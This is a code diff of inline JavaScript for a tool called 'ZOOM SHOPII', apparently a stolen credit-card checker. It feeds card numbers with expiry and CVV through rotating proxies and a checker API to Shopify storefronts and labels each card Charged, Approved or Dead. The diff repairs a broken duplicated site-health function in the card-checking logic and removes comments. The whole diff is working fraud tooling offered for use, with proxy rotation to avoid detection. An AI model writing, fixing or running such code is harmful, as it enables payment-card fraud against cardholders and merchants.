@@ -1275,7 +1275,7 @@
 
     <script>
         // ================================================================
-        // ZOOM SHOPII - ULTRA FAST EDITION WITH DEBUG
+        // ZOOM SHOPII - ULTRA FAST EDITION WITH DEBUG (FIXED)
         // ================================================================
 
         // ===== CONFIGURATION =====
@@ -1322,7 +1322,7 @@
         async function testAPI() {
             logDebug('🔍 Testing API connection...', 'info');
             try {
-                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY;
+                const url = CONFIG.API_SERVERS[0] + '/shopify?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY;
                 logDebug(`📡 Requesting: ${url.substring(0, 80)}...`, 'info');
                 const response = await fetch(url, {
                     headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
@@ -1340,10 +1340,9 @@
             }
         }
 
-        // ===== FIXED: TEST PROXY - Uses actual proxy with timeout =====
+        // ===== FIXED: TEST PROXY =====
         async function testProxy(proxy) {
             try {
-                // Parse the proxy string
                 let proxyStr = proxy;
                 if (typeof proxy === 'object' && proxy !== null) {
                     proxyStr = proxy.proxy || proxy.toString();
@@ -1352,20 +1351,16 @@
                     proxyStr = String(proxyStr);
                 }
                 
-                // Extract proxy components
                 let proxyUrl = null;
                 const parts = proxyStr.split(':');
                 
                 if (parts.length === 4) {
-                    // Format: IP:PORT:USER:PASS
                     const [ip, port, user, password] = parts;
                     proxyUrl = `http://${user}:${password}@${ip}:${port}`;
                 } else if (parts.length === 2) {
-                    // Format: IP:PORT
                     const [ip, port] = parts;
                     proxyUrl = `http://${ip}:${port}`;
                 } else if (proxyStr.includes('@')) {
-                    // Format: user:pass@host:port
                     const match = proxyStr.match(/^([^:]+):([^@]+)@([^:]+):(\d+)$/);
                     if (match) {
                         const [, user, password, host, port] = match;
@@ -1373,12 +1368,10 @@
                     }
                 }
                 
-                // If no valid proxy format, try using as-is
                 if (!proxyUrl) {
                     proxyUrl = `http://${proxyStr}`;
                 }
                 
-                // Test using multiple endpoints
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 10000);
                 
@@ -1559,12 +1552,10 @@
             const trimmed = line.trim();
             if (!trimmed) return false;
 
-            // FORMAT 1: user:pass@host:port (with IP or Domain)
             if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(trimmed)) return true;
 
             const parts = trimmed.split(':');
 
-            // FORMAT 2: host:port:user:pass (host can be IP or Domain)
             if (parts.length === 4) {
                 const host = parts[0];
                 const port = parts[1];
@@ -1573,7 +1564,6 @@
                 if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
             }
 
-            // FORMAT 3: host:port (with IP or Domain)
             if (parts.length === 2) {
                 const host = parts[0];
                 const port = parts[1];
@@ -1582,7 +1572,6 @@
                 if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
             }
 
-            // FORMAT 4: host:port@user:pass (rare but supported)
             if (trimmed.includes('@')) {
                 const atParts = trimmed.split('@');
                 if (atParts.length === 2) {
@@ -1600,7 +1589,6 @@
                 }
             }
 
-            // FORMAT 5: With protocol prefix
             const protoMatch = trimmed.match(/^(socks5|socks4|http|https):\/\/(.+)$/i);
             if (protoMatch) {
                 const rest = protoMatch[2];
@@ -1970,219 +1958,202 @@
             } catch { return 0; }
         }
 
-      // ================================================================
-// 🔥 FIXED: IS SITE DEAD - Catches NO_PRODUCT and handles THROTTLED
-// ================================================================
-function isSiteDead(responseMsg, gateway, price) {
-    if (!responseMsg) return false;  // ← Don't kill on empty
-    
-    const r = String(responseMsg).toLowerCase();
-    
-    // Only kill on true infrastructure failures
-    const permanentDead = [
-        'invalid url', 'domain name not found', 'host not found',
-        'could not resolve', 'connection refused',
-        'http 404', 'page not found', 'not found',
-        'invalid site', 'site not supported'
-    ];
-    
-    for (const kw of permanentDead) {
-        if (r.includes(kw)) return true;
-    }
-    
-    // 🔥 Don't kill on NO_PRODUCT - just log it
-    if (r.includes('no_product')) {
-        logDebug(`ℹ️ NO_PRODUCT: Keeping site for retry`, 'info');
-        return false;  // ← KEEP the site!
-    }
-    
-    return false;
-}
-    
-    // PERMANENT DEATH - Only kill sites on true infrastructure or DNS failures
-    const permanentDead = [
-        'invalid url', 'domain name not found', 'host not found',
-        'could not resolve', 'connection refused',
-        'no response', 'empty reply from server',
-        'http 404', 'page not found', 'not found',
-        'invalid site', 'site not supported'
-    ];
-    
-    for (const kw of permanentDead) {
-        if (r.includes(kw)) {
-            logDebug(`❌ Site is permanently dead: ${kw}`, 'error');
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-// ================================================================
-// 🔥 FIXED: CHECK CARD - Handles NO_PRODUCT with retry routing
-// ================================================================
-async function checkCard(card, site, proxy) {
-    // Handle site as object or string
-    if (typeof site === 'object' && site !== null) {
-        site = site.url || site.toString();
-    }
-    if (typeof site !== 'string') {
-        site = String(site);
-    }
-    
-    const startTime = Date.now();
-    logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
-    
-    try {
-        const parts = card.split('|');
-        if (parts.length !== 4) {
-            logDebug(`❌ Invalid format: ${card}`, 'error');
-            return { status: 'Invalid', message: 'Invalid format', card: card };
-        }
-        
-        if (!site.startsWith('http')) site = 'https://' + site;
-        
-        let proxyStr = proxy;
-        if (proxy) {
-            if (typeof proxy === 'object' && proxy !== null) {
-                proxyStr = proxy.proxy || proxy.toString();
-            }
-            if (typeof proxyStr !== 'string') {
-                proxyStr = String(proxyStr);
-            }
-            const proxyParts = proxyStr.split(':');
-            if (proxyParts.length === 4) {
-                proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
-            } else if (proxyParts.length === 2) {
-                proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
-            }
-        }
-        if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
-        
-        const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-        
-        // Use URLSearchParams for safe parameter encoding
-        const params = new URLSearchParams({
-            site: site,
-            key: CONFIG.CHECKER_API_KEY,
-            proxy: proxyStr,
-            cc: card
-        });
-        
-        const url = `${apiBase}/shopify?${params.toString()}`;
-        logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
-        
-        const response = await fetch(url, {
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json',
-                'User-Agent': CONFIG.ANDROID_UA,
-                'X-Requested-With': 'XMLHttpRequest'
-            }
-        });
-        
-        const elapsed = Date.now() - startTime;
-        logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
-        
-        if (!response.ok) {
-            logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
-            return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
-        }
-        
-        const raw = await response.json();
-        logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
-        
-        const responseMsg = raw.Response || raw.card_response || raw.message || 'Unknown Gateway Response';
-        const price = raw.Price || raw.price || '-';
-        const priceValue = getPriceFromResponse(raw);
-        const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
-        const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
-        
-        // CHECK IF SITE IS DEAD (triggers retry mechanism for NO_PRODUCT/infrastructure issues)
-        if (isSiteDead(responseMsg, gateway, priceDisplay)) {
-            logDebug(`⚠️ Site error/dead detected: ${site} - ${responseMsg}`, 'warning');
-            return {
-                status: 'Site Error',
-                message: responseMsg || 'Site error detected',
-                card: card,
-                retry: true,
-                gateway: gateway,
-                price: priceDisplay,
-                price_value: priceValue
-            };
-        }
-        
-        const r = String(responseMsg).toLowerCase();
-        if (r.includes('charged') || r.includes('order_placed') || 
-            r.includes('thank you') || r.includes('payment successful')) {
-            logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
-            return {
-                status: 'Charged',
-                message: responseMsg,
-                card: card,
-                site: site,
-                gateway: gateway,
-                price: priceDisplay,
-                price_value: priceValue,
-                responseType: 'ORDER_PLACED'
-            };
-        } else if (r.includes('approved') || r.includes('success') || 
-            r.includes('insufficient_funds') || r.includes('insufficient funds') ||
-            r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
-            r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
-            r.includes('invalid cvv') || r.includes('incorrect cvv') ||
-            r.includes('invalid cvc') || r.includes('incorrect cvc') ||
-            r.includes('incorrect_zip') || r.includes('incorrect zip') ||
-            r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
-            r.includes('otp') || r.includes('verification required') ||
-            r.includes('authenticate') || r.includes('authentication required') ||
-            r.includes('challenge required') || r.includes('redirecting to bank') ||
-            r.includes('bank verification') || r.includes('send code') ||
-            r.includes('enter code') || r.includes('verify')) {
-            logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
-            let respType = 'APPROVED';
-            if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
-            else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
-                     r.includes('otp') || r.includes('verification required') || r.includes('authenticate')) respType = '3DS_REQUIRED';
-            else if (r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
-                     r.includes('cvv issue')) respType = 'CVV_ISSUE';
-            return {
-                status: 'Approved',
-                message: responseMsg,
-                card: card,
-                site: site,
-                gateway: gateway,
-                price: priceDisplay,
-                price_value: priceValue,
-                responseType: respType
-            };
-        } else {
-            logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
-            return {
-                status: 'Dead',
-                message: responseMsg,
-                card: card,
-                site: site,
-                gateway: gateway,
-                price: priceDisplay,
-                price_value: priceValue,
-                responseType: 'DEAD'
-            };
-        }
-    } catch (error) {
-        const elapsed = Date.now() - startTime;
-        logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
-        return {
-            status: 'Site Error',
-            message: error.message || 'API Error',
-            card: card,
-            retry: true
-        };
-    }
-}
-        
         // ================================================================
-        // CHECK CARD WITH RETRY - Handles objects
+        // 🔥 FIXED: IS SITE DEAD - CORRECTED VERSION
+        // ================================================================
+        function isSiteDead(responseMsg, gateway, price) {
+            if (!responseMsg) return false;
+            
+            const r = String(responseMsg).toLowerCase();
+            
+            // Only kill on true infrastructure failures
+            const permanentDead = [
+                'invalid url', 'domain name not found', 'host not found',
+                'could not resolve', 'connection refused',
+                'http 404', 'page not found', 'not found',
+                'invalid site', 'site not supported'
+            ];
+            
+            for (const kw of permanentDead) {
+                if (r.includes(kw)) {
+                    logDebug(`❌ Site is permanently dead: ${kw}`, 'error');
+                    return true;
+                }
+            }
+            
+            // Don't kill on NO_PRODUCT - just log it
+            if (r.includes('no_product')) {
+                logDebug(`ℹ️ NO_PRODUCT: Keeping site for retry`, 'info');
+                return false;
+            }
+            
+            return false;
+        }
+
+        // ================================================================
+        // 🔥 FIXED: CHECK CARD
+        // ================================================================
+        async function checkCard(card, site, proxy) {
+            // Handle site as object or string
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
+            }
+            if (typeof site !== 'string') {
+                site = String(site);
+            }
+            
+            const startTime = Date.now();
+            logDebug(`🔍 Checking: ${maskCard(card)} on ${site}`, 'info');
+            
+            try {
+                const parts = card.split('|');
+                if (parts.length !== 4) {
+                    logDebug(`❌ Invalid format: ${card}`, 'error');
+                    return { status: 'Invalid', message: 'Invalid format', card: card };
+                }
+                
+                if (!site.startsWith('http')) site = 'https://' + site;
+                
+                let proxyStr = proxy;
+                if (proxy) {
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
+                    if (proxyParts.length === 4) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+                    } else if (proxyParts.length === 2) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
+                    }
+                }
+                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
+                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+                
+                const params = new URLSearchParams({
+                    site: site,
+                    key: CONFIG.CHECKER_API_KEY,
+                    proxy: proxyStr,
+                    cc: card
+                });
+                
+                const url = `${apiBase}/shopify?${params.toString()}`;
+                logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
+                
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                        'User-Agent': CONFIG.ANDROID_UA,
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                const elapsed = Date.now() - startTime;
+                logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
+                
+                if (!response.ok) {
+                    logDebug(`❌ HTTP ${response.status}: ${response.statusText}`, 'error');
+                    return { status: 'Site Error', message: `HTTP ${response.status}`, card: card, retry: true };
+                }
+                
+                const raw = await response.json();
+                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+                
+                const responseMsg = raw.Response || raw.card_response || raw.message || 'Unknown Gateway Response';
+                const price = raw.Price || raw.price || '-';
+                const priceValue = getPriceFromResponse(raw);
+                const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
+                const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
+                
+                // Check if site is dead
+                if (isSiteDead(responseMsg, gateway, priceDisplay)) {
+                    logDebug(`⚠️ Site error/dead detected: ${site} - ${responseMsg}`, 'warning');
+                    return {
+                        status: 'Site Error',
+                        message: responseMsg || 'Site error detected',
+                        card: card,
+                        retry: true,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue
+                    };
+                }
+                
+                const r = String(responseMsg).toLowerCase();
+                if (r.includes('charged') || r.includes('order_placed') || 
+                    r.includes('thank you') || r.includes('payment successful')) {
+                    logDebug(`💎 CHARGED! ${maskCard(card)}`, 'success');
+                    return {
+                        status: 'Charged',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: 'ORDER_PLACED'
+                    };
+                } else if (r.includes('approved') || r.includes('success') || 
+                    r.includes('insufficient_funds') || r.includes('insufficient funds') ||
+                    r.includes('invalid_cvv') || r.includes('incorrect_cvv') || 
+                    r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                    r.includes('invalid cvv') || r.includes('incorrect cvv') ||
+                    r.includes('invalid cvc') || r.includes('incorrect cvc') ||
+                    r.includes('incorrect_zip') || r.includes('incorrect zip') ||
+                    r.includes('cvv issue') || r.includes('3d') || r.includes('3d secure') ||
+                    r.includes('otp') || r.includes('verification required') ||
+                    r.includes('authenticate') || r.includes('authentication required') ||
+                    r.includes('challenge required') || r.includes('redirecting to bank') ||
+                    r.includes('bank verification') || r.includes('send code') ||
+                    r.includes('enter code') || r.includes('verify')) {
+                    logDebug(`✅ APPROVED! ${maskCard(card)}`, 'success');
+                    let respType = 'APPROVED';
+                    if (r.includes('insufficient_funds') || r.includes('insufficient funds')) respType = 'INSUFFICIENT_FUNDS';
+                    else if (r.includes('3d') || r.includes('3d secure') || r.includes('challenge required') || r.includes('redirecting to bank') || 
+                             r.includes('otp') || r.includes('verification required') || r.includes('authenticate')) respType = '3DS_REQUIRED';
+                    else if (r.includes('invalid_cvv') || r.includes('incorrect_cvv') || r.includes('invalid_cvc') || r.includes('incorrect_cvc') ||
+                             r.includes('cvv issue')) respType = 'CVV_ISSUE';
+                    return {
+                        status: 'Approved',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: respType
+                    };
+                } else {
+                    logDebug(`❌ DECLINED: ${responseMsg.substring(0, 30)}`, 'error');
+                    return {
+                        status: 'Dead',
+                        message: responseMsg,
+                        card: card,
+                        site: site,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue,
+                        responseType: 'DEAD'
+                    };
+                }
+            } catch (error) {
+                const elapsed = Date.now() - startTime;
+                logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
+                return {
+                    status: 'Site Error',
+                    message: error.message || 'API Error',
+                    card: card,
+                    retry: true
+                };
+            }
+        }
+
+        // ================================================================
+        // CHECK CARD WITH RETRY
         // ================================================================
         async function checkCardWithRetry(card, maxRetries = 3) {
             if (state.sites.length === 0) {
@@ -2195,7 +2166,6 @@ async function checkCard(card, site, proxy) {
             }
             
             for (let attempt = 0; attempt < maxRetries; attempt++) {
-                // Extract URL from site object
                 const siteObj = state.sites[Math.floor(Math.random() * state.sites.length)];
                 const site = typeof siteObj === 'object' ? siteObj.url : siteObj;
                 
@@ -2215,10 +2185,9 @@ async function checkCard(card, site, proxy) {
         }
 
         // ================================================================
-        // TEST SITE WITH PRICE - Handles objects
+        // TEST SITE WITH PRICE
         // ================================================================
         async function testSiteWithPrice(site, proxy) {
-            // Handle site as object or string
             if (typeof site === 'object' && site !== null) {
                 site = site.url || site.toString();
             }
@@ -2337,7 +2306,7 @@ async function checkCard(card, site, proxy) {
         });
 
         // ================================================================
-        // QUICK CHECK - ULTRA FAST
+        // QUICK CHECK
         // ================================================================
         async function processQuickCheck() {
             const total = quickCardsList.length;
@@ -2535,7 +2504,7 @@ async function checkCard(card, site, proxy) {
         });
 
         // ================================================================
-        // MASS CHECK - ULTRA FAST
+        // MASS CHECK
         // ================================================================
         async function processMassCheck() {
             const total = massCardsList.length;
@@ -2882,7 +2851,6 @@ async function checkCard(card, site, proxy) {
             els.manualSites.value = '';
         });
 
-        // 🔥 FIXED: Check sites and remove dead ones IMMEDIATELY
         els.checkSitesBtn.addEventListener('click', async function() {
             if (state.sites.length === 0) { alert('No sites to check!'); return; }
             if (state.proxies.length === 0) { alert('❌ No proxies available!'); return; }
@@ -2894,7 +2862,6 @@ async function checkCard(card, site, proxy) {
             const total = state.sites.length;
             let checked = 0, alive = 0, dead = 0;
             
-            // Loop BACKWARDS so we can remove from the SAME list safely
             for (let i = state.sites.length - 1; i >= 0; i--) {
                 const site = state.sites[i];
                 const siteUrl = typeof site === 'object' ? site.url : site;
@@ -2907,7 +2874,6 @@ async function checkCard(card, site, proxy) {
                     alive++;
                 } else {
                     dead++;
-                    // IMMEDIATELY REMOVE the dead site from the SAME list
                     state.sites.splice(i, 1);
                     renderSites();
                     updateStats();
@@ -3039,7 +3005,6 @@ async function checkCard(card, site, proxy) {
             let checked = 0, alive = 0, dead = 0;
             const aliveProxies = [];
 
-            // Process in smaller batches to avoid timeouts
             const batchSize = 10;
             
             for (let i = 0; i < state.proxies.length; i += batchSize) {
